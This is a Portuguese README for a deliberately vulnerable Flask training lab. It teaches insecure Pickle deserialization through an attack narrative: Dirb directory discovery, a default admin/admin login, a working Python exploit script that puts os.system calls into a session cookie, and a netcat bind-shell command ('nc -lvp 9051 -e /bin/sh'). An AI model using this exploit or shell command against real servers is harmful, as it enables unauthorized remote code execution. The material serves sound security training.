# Amarelo Designs

[Access content in English](README.md)

<p align="center">
    <img src="images/Amarelo-Designs.png"/>
</p>

Esta é uma aplicação web simples construída com Flask que contém um exemplo de vulnerabilidade de falha de integridade de software e dados e, seu principal objetivo é descrever como um usuário malicioso poderia explorar uma vulnerabilidade, instalada intencionalmente no Amarelo Designs do secDevLabs, para obter dados remotos cegos execução do código. 

## Index

- [Definição](#O-que-é-falha-de-integridade-de-software-e-dados)
- [Como inicializar o aplicativo?](#como-inicializar-o-aplicativo)
- [Narrativa de ataque](#narrativa-de-ataque)
- [Objetivos](#proteger-este-aplicativo)
- [Soluções](#pr-soluções)
- [Contribuição](#contribuição)

## O que é falha de integridade de software e dados?

A serialização é o processo de tradução de estruturas de dados ou estado de objeto, em um formato que pode ser armazenado ou transmitido e reconstruído posteriormente. A desserialização insegura geralmente leva à execução remota de código. Mesmo que as falhas de desserialização não resultem em execução remota de código, elas podem ser usadas para realizar ataques, incluindo ataques de repetição, ataques de injeção e ataques de escalação de privilégios. 

O objetivo principal deste aplicativo é discutir como as vulnerabilidades **Software and Data Integrity Failure** podem ser exploradas e encorajar os desenvolvedores a enviar solicitações pull do secDevLabs sobre como mitigar essas falhas. 

## Como inicializar o aplicativo?

Para iniciar este **aplicativo inseguro** intencionalmente, você precisará do [Docker][Docker Install] e do [Docker Compose][Docker Compose Install]. Depois de clonar o repositório [secDevLabs](https://github.com/globocom/secDevLabs), no seu computador, você deve digitar os seguintes comandos para iniciar o aplicativo:

```sh
cd secDevLabs/owasp-top10-2021-apps/a8/amarelo-designs
```

```sh
make install
```

Depois é só visitar [localhost:10008][app] ! 😆

## Conheça o app 🎨

Para entender corretamente como esse aplicativo funciona, você pode seguir estes passos simples:

- Visite a página inicial!
- Dê uma olhada no portfólio

## Narrativa de ataque

Agora que você conhece o propósito deste aplicativo, o que pode dar errado? A seção a seguir descreve como um invasor pode identificar e, eventualmente, encontrar informações confidenciais sobre o aplicativo ou seus usuários. Recomendamos que você siga estas etapas e tente reproduzi-las por conta própria para entender melhor o ataque! 😜

### 👀

#### O uso de uma função de desserialização insegura permite a execução remota de código

É possível acessar a aplicação web do servidor a partir da porta HTTP 10008, como mostra a imagem abaixo:

<img src="images/attack1.png" align="center"/>

Fazendo uso da ferramenta [Dirb] para pesquisar páginas da web e diretórios comuns [wordlist], conseguimos encontrar `/user`, `/admin` e `/console`, como mostra a figura abaixo: (Se você deseja instalar o Dirb para Mac OS, certifique-se de clicar [aqui][4]) 

```sh
$ dirb http://localhost:10008 ./../../../docs/common.txt
```

<p align="center">
    <img src="images/attack2.png"/>
</p>

Ao ser acessada, a página `/admin` expõe uma tela de autenticação, conforme ilustrado na imagem: 

<p align="center">
    <img src="images/attack3.png"/>
</p>

### 🔥

Um teste rápido utilizando `admin` como credenciais para os campos `Username` e `Password`, nos dá acesso a um Admin Dashboard, conforme mostrado abaixo:

<img src="images/attack4.png" align="center"/>

Agora, usando o [Burp Suite] como proxy para interceptar a solicitação de login, podemos ver que o aplicativo retorna um cookie de sessão, `sessionId`, conforme ilustrado abaixo:

<img src="images/attack5.png" align="center"/>

Após decodificar o cookie, que está em base64, foi encontrada a seguinte estrutura:

<img src="images/attack6.png" align="center"/>

A estrutura encontrada é muito semelhante às criadas com a função [Pickle]. Podemos ter certeza disso dando uma olhada no [código][3] do aplicativo. A dica já está confirmada, o app usa Pickle, como podemos ver na imagem abaixo:

<img src="images/attack7.png" align="center"/>

Se um invasor souber que o aplicativo usa `Pickle` como método de serialização, ele poderá criar um cookie malicioso para aproveitá-lo e executar o código remotamente. Um exemplo de exploit (serializaPickle.py) no Python 3 que poderia produzir esse cookie poderia ser:

```python
import pickle
import os
import base64
import sys
import requests

cmd = str(sys.argv[1])
url = str(sys.argv[2])


class Exploit(object):
    def __reduce__(self):
        return (os.system, (cmd, ))


pickle_result = pickle.dumps(Exploit())

result = str(base64.b64encode(pickle_result), "utf-8")

print(result)
print(cmd)
print(url)

cookie = {'sessionId': result}

print(cookie)

r = requests.get(url, cookies=cookie)
```

Para ter certeza de que o aplicativo é explorável, enviaremos um comando de suspensão para que o aplicativo não responda por 10 segundos. Se o aplicativo demorar 10 segundos para retornar nossa solicitação, então está confirmado, o aplicativo é explorável. Como podemos ver na imagem abaixo, o aplicativo demora um pouco para retornar nossa solicitação, confirmando assim que é explorável e confirmando a execução remota do código:

```sh
$ python3 serializaPickle.py "sleep 10" http://localhost:10008/user
```

<img src="images/attack9.png" align="center"/>

Para mostrar como um invasor pode ter acesso ao servidor por meio de um RCE, usaremos o código descrito na imagem abaixo para criar um shell de ligação na porta 9051 do servidor.

```sh
$ python3 serializaPickle.py "nc -lvp 9051 -e /bin/sh" http://localhost:10008/user
```

<img src="images/attack10.png" align="center"/>

O código usado acima cria um shell de ligação na porta 9051 do servidor, que está ouvindo as conexões de entrada. Depois disso, o invasor pode se conectar a essa porta usando um simples comando [netcat], conforme mostrado abaixo: 

```sh
$ nc localhost 9051
```

<p align="center">
    <img src="images/attack11.png"/>
</p>

## Proteger este aplicativo

Como você arrumaria essa vulnerabilidade? Após suas alterações, um invasor não poderá:

- Execute código remotamente por meio de uma vulnerabilidade de serialização

## PR Soluções

[Alerta de spoiler 🚨 ] Para entender como essa vulnerabilidade pode ser resolvida, confira [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22Amarelo+Designs%22)!

## Contribuição

Nós encorajamos você a contribuir com o SecDevLabs! Por favor, confira a seção [Contribuição no SecDevLabs](../../../docs/CONTRIBUTING.md) de como fazer a sua contribuição!🎉 🎉

[docker install]: https://docs.docker.com/install/
[docker compose install]: https://docs.docker.com/compose/install/
[app]: http://localhost:10008
[secdevlabs]: https://github.com/globocom/secDevLabs
[2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2021-apps/a8/amarelo-designs
[dirb]: https://tools.kali.org/web-applications/dirb
[burp suite]: https://en.wikipedia.org/wiki/Burp_suite
[3]: https://github.com/globocom/secDevLabs/blob/master/owasp-top10-2021-apps/a8/amarelo-designs/app/app.py
[pickle]: https://docs.python.org/2/library/pickle.html
[netcat]: https://en.wikipedia.org/wiki/Netcat
[4]: https://github.com/globocom/secDevLabs/blob/master/docs/Dirb.md
[wordlist]: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt
